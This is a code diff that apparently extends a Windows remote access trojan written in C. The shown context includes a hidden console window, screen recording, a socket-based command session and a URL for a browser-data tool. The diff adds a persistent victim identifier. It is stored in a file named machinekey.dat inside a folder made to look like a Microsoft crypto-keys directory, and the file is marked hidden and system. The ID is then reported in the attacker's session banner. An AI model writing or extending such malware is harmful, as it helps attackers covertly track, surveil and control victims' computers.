@@ -253,6 +253,7 @@ char g_chromelevator_url[512] = "https://github.com/adhikarisubodh9991/sub6-wind
 SOCKET g_sock = INVALID_SOCKET;
 char g_computer_name[MAX_COMPUTERNAME_LENGTH + 1];
 char g_username[256];
+char g_client_id[64];  // Unique client identifier (persisted)
 char g_current_dir[MAX_PATH];
 volatile int g_connected = 0;
 volatile int g_should_exit = 0;
@@ -391,6 +392,58 @@ void stop_screenrecord();
 void download_screenrecord();
 void delete_screenrecord();
 DWORD WINAPI screenrecord_thread(LPVOID param);
+
+// Generate or load unique client ID (persisted in hidden file)
+void init_client_id() {
+    char appdata_path[MAX_PATH];
+    char id_file[MAX_PATH];
+    
+    // Get AppData\Local path
+    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) != S_OK) {
+        // Fallback: generate random ID (not persisted)
+        sprintf(g_client_id, "%08lX%08lX", GetTickCount(), GetCurrentProcessId());
+        return;
+    }
+    
+    // Hidden directory for ID file
+    char id_dir[MAX_PATH];
+    sprintf(id_dir, "%s\\Microsoft\\Crypto\\Keys", appdata_path);
+    CreateDirectoryA(id_dir, NULL);
+    
+    sprintf(id_file, "%s\\machinekey.dat", id_dir);
+    
+    // Try to read existing ID
+    FILE* f = fopen(id_file, "rb");
+    if (f) {
+        if (fread(g_client_id, 1, 32, f) >= 16) {
+            g_client_id[32] = '\0';
+            fclose(f);
+            return;
+        }
+        fclose(f);
+    }
+    
+    // Generate new unique ID (hardware-based + random)
+    DWORD vol_serial = 0;
+    GetVolumeInformationA("C:\\", NULL, 0, &vol_serial, NULL, NULL, NULL, 0);
+    
+    // Combine multiple sources for uniqueness
+    sprintf(g_client_id, "%08lX%08lX%08lX%04X",
+            vol_serial,
+            GetTickCount(),
+            GetCurrentProcessId(),
+            (unsigned int)(rand() & 0xFFFF));
+    
+    // Save for persistence
+    f = fopen(id_file, "wb");
+    if (f) {
+        fwrite(g_client_id, 1, strlen(g_client_id), f);
+        fclose(f);
+        // Hide the file
+        SetFileAttributesA(id_file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+}
+
 void stealth_mode() {
     HWND hwnd = GetConsoleWindow();
     if (hwnd) {
@@ -3448,11 +3501,12 @@ void handle_command(const char* cmd) {
                "\n[+] Session %d\n"
                "[*] Computer: %s\n"
                "[*] User: %s\n"
+               "[*] ClientID: %s\n"
                "[*] OS: Windows %ld.%ld\n"
                "[*] Arch: %s\n"
                "[*] PID: %lu\n"
                "[*] Dir: %s\n\n",
-               g_session_id, g_computer_name, g_username,
+               g_session_id, g_computer_name, g_username, g_client_id,
                osvi.dwMajorVersion, osvi.dwMinorVersion,
                (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86",
                GetCurrentProcessId(), g_current_dir);
@@ -3690,12 +3744,13 @@ void handle_session() {
            "\n[+] Session %d opened\n"
            "[*] Computer: %s\n"
            "[*] User: %s\n"
+           "[*] ClientID: %s\n"
            "[*] OS: Windows %ld.%ld\n"
            "[*] Arch: %s\n"
            "[*] PID: %lu\n"
            "[*] Dir: %s\n"
            "[*] Type 'help' for commands\n\n",
-           g_session_id, g_computer_name, g_username,
+           g_session_id, g_computer_name, g_username, g_client_id,
            osvi.dwMajorVersion, osvi.dwMinorVersion,
            (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86",
            GetCurrentProcessId(), g_current_dir);
@@ -5404,6 +5459,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     size = sizeof(g_username);
     GetUserNameA(g_username, &size);
+    
+    // Initialize unique client ID (for multi-instance support)
+    init_client_id();
     
     GetCurrentDirectoryA(MAX_PATH, g_current_dir);
     
